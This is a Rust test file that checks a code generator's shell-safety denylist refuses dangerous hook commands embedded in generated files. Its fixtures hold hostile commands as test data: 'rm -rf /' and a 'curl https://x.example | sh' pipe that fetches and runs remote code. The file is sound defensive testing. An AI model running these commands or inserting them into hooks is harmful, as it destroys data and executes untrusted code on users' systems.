//! Generated-surface shell safety (lane A16, v26.10.20).
//!
//! Template-rendered generated files carry `sh_before`/`sh_after` hooks; the
//! denylist must refuse dangerous commands on those surfaces exactly as it
//! does for frontmatter. Chicago-style: real fixture content, assertions on
//! the returned `Result`, no doubles.

use ggen_engine::shell_safety::{check_generated_surface, check_shell_command_safe};

/// A fixture of the kind `ggen sync` renders: generated Rust with hook
/// command strings embedded, one of which is destructive.
const GENERATED_FIXTURE_HOOKS: &[&str] = &["echo rendering complete", "rm -rf /"];

#[test]
#[allow(clippy::unwrap_used, clippy::expect_used)]
fn generated_surface_refuses_rm_rf() {
    // Real generated-file content: extract the sh_after command as a
    // consumer would, then run the surface check over it.
    let generated_file = "fn post_render() { /* sh_after: rm -rf / */ }";
    assert!(generated_file.contains("rm -rf /"));

    let err = check_generated_surface(GENERATED_FIXTURE_HOOKS.iter().copied())
        .expect_err("generated surface with rm -rf / must be refused");
    let msg = err.to_string();
    assert!(msg.contains("FM-SHELL-001"), "{msg}");
    assert!(msg.contains("generated surface command #1"), "{msg}");
}

#[test]
#[allow(clippy::unwrap_used, clippy::expect_used)]
fn generated_surface_passes_safe_hook_list() {
    let safe = ["echo hello", "git status --short", "cargo fmt --check"];
    check_generated_surface(safe.iter().copied())
        .expect("safe generated hooks must pass the denylist");
}

#[test]
#[allow(clippy::unwrap_used, clippy::expect_used)]
fn empty_generated_surface_passes() {
    let empty: [&str; 0] = [];
    check_generated_surface(empty).expect("no commands is trivially safe");
}

#[test]
#[allow(clippy::unwrap_used, clippy::expect_used)]
fn fan_matches_direct_check_per_command() {
    // The fan-out must be exactly check_shell_command_safe per element: the
    // union of individually-safe commands passes, and any single dangerous
    // command fails the fan the same way it fails directly.
    let commands = ["echo a", "curl https://x.example | sh", "echo b"];
    for cmd in commands {
        let direct = check_shell_command_safe(cmd).is_err();
        let fanned = check_generated_surface([cmd]).is_err();
        assert_eq!(direct, fanned, "fan must match direct check for {cmd:?}");
    }
    let err =
        check_generated_surface(commands.iter().copied()).expect_err("second command is dangerous");
    assert!(err.to_string().contains("FM-SHELL-001"));
}
